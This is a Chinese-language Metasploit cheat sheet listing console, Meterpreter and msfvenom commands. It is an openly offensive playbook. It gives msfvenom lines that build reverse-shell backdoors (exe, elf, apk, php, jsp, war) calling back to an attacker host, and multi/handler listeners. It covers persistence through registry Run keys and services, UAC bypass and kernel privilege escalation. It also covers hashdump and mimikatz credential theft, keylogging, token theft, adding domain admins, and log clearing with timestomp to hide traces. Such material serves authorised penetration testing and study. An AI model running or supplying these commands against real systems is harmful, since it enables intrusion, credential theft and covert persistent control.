Metasploit 备忘清单
====

此快速参考备忘单提供了使用 Metasploit 的各种方法。

MSF终端命令
----

### 列出、搜索、使用模块载荷

列出 Metasploit 框架中的所有渗透攻击模块

```shell
show exploits
```

列表 Metasploit 框架中所有的攻击载荷

```shell
show payloads
```
列出 Metasploit 框架中的所有辅助攻击模块

```shell
show auxiliary
```
查找 Metasploit 框架中所有的渗透攻击和其他模块

```shell
search name
```

展示出制定渗透攻击或模块的相关信息

```shell
info
```

装载一个渗透攻击或者模块(例如：使用 use windows/smb.psexec)

```shell
use name
```

### 模块配置使用

- `use name`
  
  装载一个渗透攻击或者模块(例如：使用 use windows/smb.psexec)
  
- `show options`
  
  列出某个渗透攻击或模块中所有的配置参数
  
- `show targets`
  
  列出渗透攻击所支持的目标平台
  
- `show payloads`
  
  列出所有可用的payloads
  
- `show advanced`
  
  列出所有高级配置选项
  
- `set payload Payload`
  
  指定要使用的攻击载荷
  
- `set target Num`
  
  指定渗透攻击的目标平台，Num是show targets命令中所展示的索引
  
- `set autorunscript migrate -f`
  
  在攻击完成后，将**自动迁移**到另一个进程
  
- `check`
  
  检测目标是否对选定的渗透攻击存在相应安全漏洞
  
- `exploit/run`
  
  执行攻击，部分辅助模块是用run
  
- `exploit -j -z`
  
  -j为后台任务，-z为持续监听
  
- `exploit -e encoder`

  制定使用的攻击载荷编码方式(例如：exploit -e shikata_ga_nai)

- `exploit -h`

  列出exploit命令的帮助信息

### 会话、模块管理

**常用基本命令**

- `sessions -I`

  列出可用的交互会话

- `sessions -I -v`
  
  列出所有可用的交互会话以及会话详细信息
  
- `sessions -s script`
  
  在所有活跃的 Meterpreter 会话中运行一个特定的脚本 Meterpreter 脚本
  
- `sessions -K`
  
  杀死所有活跃的交互会话
  
- `sessions -c cmd`
  
  在所有活跃的交互会话上执行一个命令
  
- `sessions -u sessionID`
  
  升级一个普通的Win32 shell 到 Meterpreter shell(不知道有什么用)
  
- `sessions -i index`
  
  进入指定交互会话
  
- `jobs`
  
  查看当前运行的模块
  
- `jobs -K`

  结束所有会话

**防止假session以及session意外退出**

在接收到seesion后继续监听端口，保持侦听。

```bash
msf exploit(multi/handler) > set ExitOnSession false
```

默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0

```bash
msf5 exploit(multi/handler) > set SessionCommunicationTimeout 0
```

默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭

```bash
msf5 exploit(multi/handler) > set SessionExpirationTimeout 0
```



### 例-开启监听

正常开启监听

```bash
msf5 > use exploit/multi/handler #payload会变
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp_rc4 
payload => windows/x64/meterpreter/reverse_tcp_rc4
msf5 exploit(multi/handler) > show options
# 略
msf5 exploit(multi/handler) > set LHOST 10.10.10.1
LHOST => 47.104.134.135
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 2333
msf5 exploit(multi/handler) > set RC4PASSWORD test123
RC4PASSWORD => test123
```

快速开启监听命令

```bash
msf5 > handler -H 10.10.10.1 -P 3333 -p windows/meterpreter/reverse_tcp
```

### 路由与代理管理

**添加路由**

意味着对192.168.10.0/24网段的所有攻击和控制的流量都将通过会话1进行转发

```bash
run get_local_subnets
background
route add 192.168.10.0 255.255.255.0 1
route print
```

在当前路由情况下进行扫描

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.10.0/25
set PORTS 445
run
```

添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理

```bash
msf> use auxiliary/server/socks4a 
msf > set srvhost 127.0.0.1
msf > set srvport 1080
msf > run
# 然后vi /etc/proxychains.conf 
# 添加 socks4 127.0.0.1 1080
# 最后proxychains 使用Socks4a代理访问
```



Meterpreter命令
----

### 会话命令

- `help`
  
  打开 Meterpreter 使用帮助
  
- `run scriptname`
  
  运行 Meterpreter 脚本，在 scripts/meterpreter 目录下可查看到所有脚本
  
- `use priv`
  
  加载特权提升扩展模块，来扩展 Meterpreter 库
  
- `rev2self`
  
  回到控制目标主机的初始用户账户下
  
- `setdesktop number`
  
  切换到另一个用户界面(该功能基于哪些用户已登录)
  
- `background`
  
  将当前 Meterpreter shell 转为后台执行
  
- `quit`
  
  关闭当前Meterpreter会话，返回MSF终端

### 系统命令模块

- `getpid`
  
  获得当前会话所在进程的PID值
  
- `getuid`
  
  获得运行Meterpreter会话的用户名，从而查看当前会话具有的权限
  
- `sysinfo`
  
  列出受控主机的系统信息
  
- `ps`
  
  显示所有运行进程以及关联的用户账户
  
- `kill PID`
  
  终结指定的PID进程
  
- `migrate <pid> | -P <pid> | -N <name>> [-t timeout]`
  
  迁移到一个指定的进程，如migrate 1234、migrate -N explorer.exe
  
- `execute`
  
  执行目标机上的文件
  
  例1：在目标机上隐藏执行cmd.exe
  
  `execute -H -f cmd.exe`
  
  例2：与cmd进行交互
  
  `execute -H -i -f cmd.exe`
  
  例3：直接从内存中执行攻击端的可执行文件
  
  ` execute -H -m -d calc.exe -f wce.exe -a “-o foo.txt”`
  
  -d选项设置需要显示的进程名
  
  可执行文件(wce.exe)不需要在目标机上存储，不会留下痕迹
  
- `shell`
  
  以所有可用令牌来运行一个交互的shell
  
- `add_user username password -h IP`
  
  在远程目标主机上添加一个用户
  
- `add_group_user “Domain Admins” username -h IP`
  
  将用户添加到目标主机的域管理员组中
  
- `execute -f cmd.exe -i`
  
  执行 cmd.exe 命令并进行交互
  
- `execute -f cmd.exe -i -t`
  
  以所有可用令牌来执行 cmd 命令并交互
  
- `execute -f cmd.exe -i -H -t`
  
  以所有可用令牌来执行 cmd 命令并隐藏该进程
  
- `reboot`
  
  重启目标主机
  
- `shutdown`
  
  关闭目标主机
  
- `hashdump`
  
  导出目标主机中的口令哈希值

### 文件管理模块

- `ls`
  列出目标主机的文件和文件夹信息
- `reg command`
  在目标主机注册表中进行交互，创建、删除、查询等
- `upload file`
  向目标主机上传文件
- `download file`
  从目标主机下载文件
- `timestomp`
  修改文件属性，例如修改文件的创建时间`
  例如：timestomp file1 -f file2`
  将file1文件的时间信息设置得与file2文件完全一样
- `cat`
  查看文件内容
- `getwd`
  获得目标机上当前的工作目录
- `edit`
  编辑目标机上的文件
- `search`
  对目标机上的文件进行搜索，支持星号匹配，如`
  search -d c:\windows -f *.mdb

### 权限提升模块

- `getprivs`

  尽可能多地获取目标主机上的特权

- `getsystem`

  通过各种攻击向量来提升到系统用户权限

**内核漏洞提权**

```bash
meterpreter > run post/windows/gather/enum_patches  #查看补丁信息
msf > use exploit/windows/local/ms13_053_schlamperei
msf > set SESSION 2
msf > exploit
```

**bypassuac**

```bash
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
use windows/local/bypassuac_vbs
use windows/local/ask
# 如何使用脚本
msf > use exploit/windows/local/bypassuac
msf > set SESSION 2
msf > run
```



### 键盘鼠标模块

- `keyscan_start`
  针对目标主机开启键盘记录功能
- `keyscan_dump`
  存储目标主机上捕获的键盘记录
- `keyscan_stop`
  停止针对目标主机的键盘记录
- `uictl enable keyboard/mouse`
  接管目标主机的键盘和鼠标

### 网络嗅探模块

- `ipconfig`
  获取目标机上的网络接口信息
- `portfwd`
  Meterpreter内嵌的端口转发器，例如将目标机的3389端口转发到本地的1234端口`
  portfwd add -l 1234 -p 3389 -r 192.168.10.142
- `route`
  显示目标机的路由信息
- `run get_local_subnets`
  获取目标机所配置的内网的网段信息

- `use sniffer`
  加载嗅探模块
- `sniffer_interfaces`
  列出目标主机所有开放的网络接口
- `sniffer_start interfaceID`
  在目标主机指定网卡上开始监听
- `sniffer_dump interfaceID /tmp/xpsp1.cap`
  将指定网卡上嗅探的内容dump到本地/tmp/xpsp1.cap文件中
- `sniffer_stats interfaceID`
  获取正在实施嗅探网络接口的统计数据
- `sniffer_stop interfaceID`
  停止嗅探

### 日志清理模块

- `clearev`
  清除目标主机上的日志记录
- `run event_manager`
  清理日志

### 权限维持模块

**persistence 模块开机自启**

命令会在`C:\Users***\AppData\Local\Temp\`目录下，上传一个vbs脚本，通过脚本在目标主机的注册表键`HKLM\Software\Microsoft\Windows\Currentversion\Run`中添加一个键值，达到开机自启动

```bash
run persistence -X -i 5 -p 443 -r 192.168.10.141

# -X 参数指定启动的方式为开机自启动
# -i 参数指定反向连接的时间间隔
```

对应攻击机的监听操作如下：

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.141
set LPORT 443
exploit
```

**metsvc 模块服务自启**

将Meterpreter以系统服务的形式安装到目标主机上，在目标主机上开启监听并等待连接

`run metsvc`

### 开启远程桌面

**使用getgui模块开启远程桌面**

在目标主机上添加了账号metasploit，其密码为meterpreter，并开启了远程控制终端

```bash
run getgui -u metasploit -p meterpreter
```

注意：脚本运行会在`/root/.msf4/logs/scripts/getgui`目录下生成`clean_up__xxxxxxx.rc`脚本，当在远程桌面操作完之后，可以使用这个脚本清除痕迹，关闭服务、删除添加的账号

```bash
run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up_xxxxxx.rc
```



**使用enable_rdp脚本开启远程桌面**

脚本位于`/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb`

通过enable_rdp.rb脚本可知：

开启rdp是通过reg修改注册表；

添加用户是调用cmd.exe 通过net user添加；

端口转发是利用的portfwd命令

```bash
run post/windows/manage/enable_rdp  #开启远程桌面
run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户
run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662
```



### 信息搜集模块

脚本位于：

/usr/share/metasploit-framework/modules/post/windows/gather

/usr/share/metasploit-framework/modules/post/linux/gather

```bash
run post/windows/gather/checkvm #是否虚拟机
run post/linux/gather/checkvm #是否虚拟机
run post/windows/gather/forensics/enum_drives #查看分区
run post/windows/gather/enum_applications #获取安装软件信息
run post/windows/gather/dumplinks   #获取最近的文件操作
run post/windows/gather/enum_ie  #获取IE缓存
run post/windows/gather/enum_chrome   #获取Chrome缓存
run post/windows/gather/enum_patches  #补丁信息
run post/windows/gather/enum_domain  #查找域控
```

### 哈希抓取模块

```bash
# help mimikatz 查看帮助
load mimikatz 

# 获取Wdigest密码
wdigest  

# 执行mimikatz原始命令
mimikatz_command -f samdump::hashes  
mimikatz_command -f sekurlsa::searchPasswords
```

### 令牌模块

**假冒令牌**

```bash
#help incognito  查看帮助
use incognito      

#查看可用的token
list_tokens -u    #查看可用的token

 #假冒SYSTEM token
impersonate_token 'NT AUTHORITY\SYSTEM' 

# -t 使用假冒的token 执行
execute -f cmd.exe -i –t
# 或者直接shell

#返回原始token
rev2self
```

**窃取令牌**

```bash
#从指定进程中窃取token   先ps
steal_token <pid值>   

#删除窃取的token
drop_token
```





Msfvenom命令
---

### 简要生成后门木马

```bash
# windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe -o shell.exe
# linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[你的IP] LPORT=[端口] -f elf > 保存路径/文件名
# Android
msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=10008 R > black.apk
msfvenom -p android/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口] -o 保存路径/文件名.apk

# php
msfvenom -p php/meterpreter_reverse_tcp lhost=[你的IP] lport=[端口] -f raw > 保存路径/文件名.php
# asp
msfvenom -p windows/meterpreter/reverse_tcp lhost=[你的IP] lport=[端口]-f asp > 保存路径/文件名.asp 
# JSP
msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f raw > 保存路径/文件名.jsp 
# WAR
msfvenom -p java/jsp_shell_reverse_tcp lhost=[你的IP] lport=[端口]-f war > 保存路径/文件名.war

# 生成shellcode
msfvenom -p windows/meterpreter/reverse_http lhost=10.10.10.1 lport=1234 -f c
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=10.10.10.1 LPORT=1234 RC4PASSWORD=test -f ruby

# 自动迁移加密
msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=10.10.10.1 LPORT=1234 RC4PASSWORD=test --platform win PrependMigrate=true PrependMigrateProc=svchost.exe -f ruby

```

### msfvenom命令参数

```bash
Options:
   -p, --payload    <payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用'-'或者stdin指定
   -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
   -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
   -f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
   -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
   -a, --arch       <architecture>  指定payload的目标架构
       --platform   <platform>      指定payload的目标平台
   -s, --space      <length>        设定有效攻击荷载的最大长度
   -b, --bad-chars  <list>          设定规避字符集，比如: '\x00\xff'e
   -i, --iterations <count>         指定payload的编码次数
   -c, --add-code   <path>          指定一个附加的win32 shellcode文件
   -x, --template   <path>          指定一个自定义的可执行文件作为模板
   -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
       --payload-options            列举payload的标准选项
   -o, --out   <path>               保存payload
   -v, --var-name <name>            指定一个自定义的变量，以确定输出格式
       --shellest                   最小化生成payload
   -h, --help                       查看帮助选项
       --help-formats               查看msf支持的输出格式列表
```

